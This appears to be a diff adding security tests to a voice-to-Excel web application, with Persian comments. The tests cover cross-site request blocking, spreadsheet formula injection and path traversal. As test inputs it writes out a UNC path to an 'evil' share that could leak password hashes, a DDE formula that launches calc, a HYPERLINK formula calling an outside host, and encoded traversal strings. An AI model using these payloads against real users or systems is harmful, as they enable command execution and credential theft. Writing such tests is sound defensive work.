@@ -204,3 +204,55 @@ def test_open_folder_only_inside_allowed_dirs(db, monkeypatch):
         assert c.post("/api/open-folder", json={"path": str(server.DATA_DIR / ".." / "..")}).status_code == 403
         assert c.post("/api/open-folder", json={"path": str(server.DATA_DIR / "uploads")}).status_code == 200
     assert len(opened) == 1
+
+
+# ---------- آزمون‌های نفوذ ----------
+def test_cross_site_get_cannot_trigger_anything(db, monkeypatch):
+    """تصویری در سایت دیگر با نشانی /api/fs و مسیر شبکه‌ای سرور مهاجم: ویندوز به آن سرور وصل می‌شد و هش
+    رمز کاربر را می‌فرستاد. حالا مرورگر Sec-Fetch-Site را می‌فرستد و درخواست پیش از رسیدن به برنامه رد می‌شود."""
+    monkeypatch.setattr(server, "_inbox_loop", lambda: None)
+    touched = []
+    with _client() as c:
+        monkeypatch.setattr(server.Path, "is_dir", lambda self: touched.append(str(self)) or False)
+        for site in ("cross-site", "same-site"):
+            for path in ("/api/fs?path=%5C%5Cevil%5Cshare", "/api/files/1/audio", "/api/report/records.xlsx", "/static/app.js"):
+                r = c.get(path, headers={"Sec-Fetch-Site": site, "Sec-Fetch-Mode": "no-cors"})
+                assert r.status_code == 403, (site, path)
+        assert not [p for p in touched if "evil" in p]
+        monkeypatch.undo()
+        # باز کردن خود برنامه از پیوند یک صفحه دیگر مجاز است (کلید را آن صفحه نمی‌تواند بخواند)
+        assert c.get("/", headers={"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate"}).status_code == 200
+        # درخواست‌های خود برنامه
+        assert c.get("/api/status", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 200
+        assert c.get("/", headers={"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate"}).status_code == 200
+
+
+def test_formula_injection_never_becomes_formula(tmp_path):
+    """مقدار یا عنوان ستونی که با = شروع شود (از ویس، اصلاح دستی یا قالبِ دریافتی از دیگری) فرمول نمی‌شود."""
+    import io
+
+    import openpyxl
+
+    from voice2excel import excel_template
+    evil = "=cmd|' /C calc'!A0"
+    tpl = excel_template.new_template("t_x", "x", str(tmp_path))
+    tpl["columns_list"][0]["title"] = evil
+    tpl = excel_template.clean(tpl)
+    data = excel_template.build_sample(tpl, [["=HYPERLINK(\"http://evil\",\"x\")", "+98 915", "@SUM(1)", "-1+2"]])
+    ws = openpyxl.load_workbook(io.BytesIO(data)).active
+    cells = [ws.cell(1, 1), ws.cell(2, 1), ws.cell(2, 2), ws.cell(2, 3), ws.cell(2, 4)]
+    assert ws.cell(1, 1).value == evil
+    assert all(c.data_type == "s" for c in cells), [(c.value, c.data_type) for c in cells]
+
+
+def test_path_traversal_in_names_rejected(db, monkeypatch):
+    from voice2excel import excel_mapping
+    monkeypatch.setattr(server, "_inbox_loop", lambda: None)
+    assert excel_mapping._safe_name(r"..\..\settings") == "_settings"
+    with _client(**server.auth_headers()) as c:
+        for bad in ("..%5C..%5Csettings", "..%2F..%2Fsettings", "%2E%2E%5Cvoice2excel"):
+            assert c.get(f"/api/templates/{bad}").status_code in (404, 400), bad
+            assert c.get(f"/api/backups/{bad}/download").status_code in (404, 400), bad
+        assert c.post("/api/knowledge/preview", json={"token": r"..\..\voice2excel.db", "sheet": "x", "header_row": 1,
+                                                      "columns": {"A": "engineer"}}).status_code == 400
+
